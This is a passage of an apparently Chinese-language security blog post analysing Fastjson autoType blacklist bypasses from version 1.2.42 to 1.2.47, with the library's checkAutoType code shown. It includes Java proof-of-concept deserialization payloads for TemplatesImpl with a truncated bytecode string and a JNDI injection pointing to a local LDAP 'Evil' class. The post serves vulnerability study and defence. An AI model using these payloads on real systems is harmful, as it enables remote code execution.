style="color:#000000;">。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h3><blockquote><p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42，在1.2.42版本中，Fastjson继续延续了黑白名单的检测模式，但是为了防止安全研究人员根据黑名单中的类进行反向研究，将黑名单类从白名单修改为使用HASH的方式进行对比。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。</font></p></blockquote><p><font style="color:#000000;">在com.alibaba.fastjson.parser.ParserConfig类中，作者将原本的明文黑名单转为使用了Hash的黑名单来防止安全人员对其研究。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734941786228-1e88fde6-e19c-46d2-be7d-0592729c1e50.png"></p><p><font style="color:#000000;">在checkAutoType方法中加入判断，如果类的第一个字符是L且结尾是;，则使用substring进行去除。但是这存在一个致命的问题，由于在最后处理时是递归处理，只进行了一次判断并去除，可以利用双写来进行绕过。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((((BASIC</span><br><span class="line">        ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">        * PRIME)</span><br><span class="line">        ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">        * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">&#123;</span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h3><blockquote><p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43，在1.2.43版本中，作者修复上一个版本中双写绕过的问题。</font></p></blockquote><p><font style="color:#000000;">可以看到用来检查的checkAutoType方法添加了判断，如果类名连续出现了两个L将会抛出异常。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"><span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> -<span class="number">3750763034362895579L</span>;</span><br><span class="line"><span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">1099511628211L</span>;</span><br><span class="line"><span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(className.length() - <span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655701488918567152L</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (((-<span class="number">3750763034362895579L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">0</span>)) * <span class="number">1099511628211L</span> ^ (<span class="type">long</span>)className.charAt(<span class="number">1</span>)) * <span class="number">1099511628211L</span> == <span class="number">655656408941810501L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">但是在TypeUtils#loadClass方法中，针对[也进行了处理和递归，利用[依旧可以进行黑名单的绕过，根据报错信息，按照格式解析要求构造Payload即可。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734943478841-70c4e764-3299-4c5e-8c6a-3bf1e7dfbdce.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc43</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;[&#123;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv6...Eg==\&quot;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_name\&quot;: \&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-44"><a href="#fastjson-1-2-44" class="headerlink" title="fastjson-1.2.44"></a>fastjson-1.2.44</h3><blockquote><p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.44，在此版本将[绕过也进行了修复，由字符串处理导致的黑名单绕过告一段落。</font></p></blockquote><p><font style="color:#000000;">在checkAutoType方法中添加了新的判断，如果类名以[开始则直接抛出异常。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line"><span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-45"><a href="#fastjson-1-2-45" class="headerlink" title="fastjson-1.2.45"></a>fastjson-1.2.45</h3><blockquote><p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45，在此版本爆出了一个黑名单绕过。</font></p></blockquote><p><font style="color:#000000;">该版本爆出的黑名单绕过为通过mybatis组件进行JNDI接口调用，在org.apache.ibatis.datasource.jndi.JndiDataSourceFactory#setProperties方法中，存在JNDI注入，进而可以加载恶意类。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734944059796-518382bc-2a14-4794-b2b5-645ef2a1135b.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc45</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;properties\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;initial_context\&quot;: \&quot;ldap://127.0.0.1:1389/Evil\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;data_source\&quot;: \&quot;1\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson-1.2.47"></a>fastjson-1.2.47</h3><blockquote><p><font style="color:#000000;">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32（未开启AutoTypeSupport），1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47，此版本Payload能够绕过checkAutoType内的各种检测，原理是通过Fastjson自带的缓存机制将恶意类加载到Mapping中，从而绕过checkAutoType检测。</font></p></blockquote><p><font style="color:#000000;">这次的绕过问题依旧还是出现在ParserConfig#checkAutoType方法中，</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">        <span class="comment">// 类名非空判断</span></span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 类名长度判断，不大于128不小于3</span></span><br><span class="line">        <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>; <span class="comment">//;</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;  <span class="comment">//L</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">        <span class="comment">// 类名以 [ 开头抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 类名以 L 开头以 ; 结尾抛出异常</span></span><br><span class="line">        <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">                * PRIME;</span><br><span class="line">        <span class="comment">// autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= className.charAt(i);</span><br><span class="line">                hash *= PRIME;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 在对比 denyHashCodes 进行黑名单匹配</span></span><br><span class="line">                <span class="comment">// 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类</span></span><br><span class="line">                <span class="comment">// 则抛出异常</span></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试在 TypeUtils.mappings 中查找缓存的 class</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 尝试在 deserializers 中查找这个类</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = deserializers.findClass(typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果找到了对应的 class，则会进行 return</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                    &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                    &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(i);</span><br><span class="line">                hash ^= c;</span><br><span class="line">                hash *= PRIME;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类</span></span><br><span class="line">        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TypeUtils.getAnnotation(clazz,JSONType.class) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger</span></span><br><span class="line">                    || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver</span></span><br><span class="line">                    ) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">JavaBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);</span><br><span class="line">            <span class="keyword">if</span> (beanInfo.creatorConstructor != <span class="literal">null</span> &amp;&amp; autoTypeSupport) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> 